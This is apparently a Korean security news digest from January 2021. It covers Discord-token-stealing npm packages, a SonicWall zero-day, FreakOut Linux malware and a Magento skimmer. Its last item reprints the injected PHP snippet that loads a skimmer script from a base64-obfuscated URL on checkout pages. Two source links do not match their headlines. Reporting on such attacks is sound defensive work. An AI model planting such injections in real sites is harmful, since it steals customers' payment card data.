## 보안동향 2021년 01월 25일  
   
    
### 1. Discord-Stealing Malware, npm 패키지 침입  
       
  
https://threatpost.com/discord-stealing-malware-npm-packages/163265/?web_view=true  
    
- CursedGrabber 맬웨어가 오픈 소스 소프트웨어 코드 저장소에 침투  
  
  
- JavaScript 개발자가 코드 블록을 공유하고 재사용 할 수있는 코드 저장소 인 npm에 3 개의 악성 소프트웨어 패키지가 게시  
  

- 코드에 의해 손상된 모든 애플리케이션은 Discord 사용자로부터 토큰 및 기타 정보를 훔칠 수 있다고 연구원들은 말함    
    
    
- Discord 토큰이 도난 당하면 공격자가 서버를 해킹 할 수 있음  

- 금요일부터 패키지 (이름이 an0n-chat-lib, discord-fix 및 sonatype, 모두 "scp173-deleted"에 의해 게시 됨)를 다운로드 할 수 있음    
  
- 11 월에 발견 된 CursedGrabber Discord 맬웨어 제품군은 Windows 호스트를 대상으로 했었음  
  
      
---
  
  
### 2. SonicWall은 자사 제품에서 제로 데이 공격에 해킹 당함  
   
   
https://threatpost.com/nvidia-gamers-dos-data-loss-shield-tv-bugs/163200/?web_view=true  
    
    
- 네트워킹 장치 제조업체 인 SonicWall은 금요일 밤 "coordinated attack"이라고 설명하는 것을 탐지 한 후 내부 네트워크의 보안 위반을 조사하고 있다고 밝힘  

- 회사는 **NetExtender** VPN 클라이언트 및  **SMA (Secure Mobile Access** ) 게이트웨이를 영향을받은 것으로 나열함  
  

- NetExtender VPN 클라이언트 버전 10.x (2020 년에 릴리스 됨)는 SMA 100 시리즈 어플라이언스 및 SonicWall 방화벽에 연결하는 데 사용  
    
    - SMA 200, SMA 210, SMA 400, SMA 410 물리적 어플라이언스 및 SMA 500v 가상 어플라이언스에서 실행되는 SMA (Secure Mobile Access) 버전 10.x.  
  

- SonicWall은 특정 제품 시리즈가 NetExtender와 다른 VPN 클라이언트를 사용하고 있기 때문에 새로운 SMA 1000 시리즈는 영향을받지 않는다고 말했음  
  

- 고객의 네트워크를 안전하게 유지하기 위해 공급 업체는 지식 기반 문서에 방화벽을 배포하여 SMA 장치와 상호 작용할 수있는 사용자를 제한하거나 NetExtender VPN 클라이언트를 통해 방화벽에 대한 액세스를 비활성화하는 것과 같은 일련의 완화 조치를 포함
     

---
  
  
### 3. Linux 장치를 대상으로하는 새로운 FreakOut 맬웨어  
           

https://www.bleepingcomputer.com/news/software/vlc-media-player-3012-fixes-multiple-remote-code-execution-flaws/?&web_view=true

   
   
- 새로 발견 된 FreakOut 이라는 악성 코드 가 Linux 기반 장치를 적극적으로 표적으로 삼고 있음  
    

- 이 악성 코드의 목적은 DDoS 공격 및 암호화 채굴을 위해 봇넷 네트워크를 전파하는 목적  
    

- 1 월 8 일부터 1 월 13 일까지 약 380 번의 공격 시도가 관찰됨  

이 새로운 악성 코드는 포트 스캐닝, 정보 수집, 데이터 패킷 및 네트워크 스니핑과 같은 다양한 기능을 제공  
  
감염된 각 장치를 원격 제어 공격 플랫폼으로 사용할 수 있음  
  
- 처음에 악성 코드는 다양한 결함과 취약점이 패치되지 않은 특정 제품이있는 Linux 장치를 대상  
    - 악용되는 결함으로는 CVE-2020-28188 (TerraMaster TOS), CVE-2021-3007 (Zend Framework) 및 CVE-2020-7961 (Liferay Portal)이 있음  
  

---
  
  
### 4. Magento PHP 주입으로 JavaScript 스키머로드  
           

https://blog.sucuri.net/2021/01/magento-php-injection-loads-javascript-skimmer.html?web_view=true  
   
조사 결과 웹 사이트에 Magento 파일 중 하나에 PHP 삽입이 포함되어 있음을 발견함

**./app/code/core/Mage/Payment/Model/Method/Cc.php**

```
. . . if  ( $ _SERVER [ " REQUEST_METHOD " ]  ===  " GET " ) { if  ( strpos ( $ _SERVER [ " REQUEST_URI " ] ,  " / onestepcheckout / index / " )  ! ==  false ) { if ( ! isset ( $ _COOKIE [ " adminhtml " ] ) ) { 
                      echo file_get_contents( base64_decode ( " aHR0cHM6Ly91bmRlcnNjb3JlZndbLl1jb20vc3JjL2tyZWEuanM = " ) ) ; } } }
```

- 감지하기 더 어렵게 만들기 위해 JavaScript 스키머는 PHP 함수 **file_get_contents** 및 **base64로** 난독 화 된 URL을 사용하여로드 됨  
  
  
- 스키머는 방문자가 결제 페이지에 있고 방문자가 관리자 로 Magento 웹 사이트에 로그인 **하지 않은** 경우 두 가지 조건이 충족 될 때만 로드됨  
    - PHP 코드는 방문자가 요청한 URI에서 strpos로 " / onestepcheckout / index / " 텍스트 문자열을 찾아 이러한 조건을 확인  
    - 또한 방문자가 관리자로 Magento 웹 사이트에 로그인했는지 여부를 나타내는 **adminhtml** 쿠키 가 방문자에게 있는지 확인   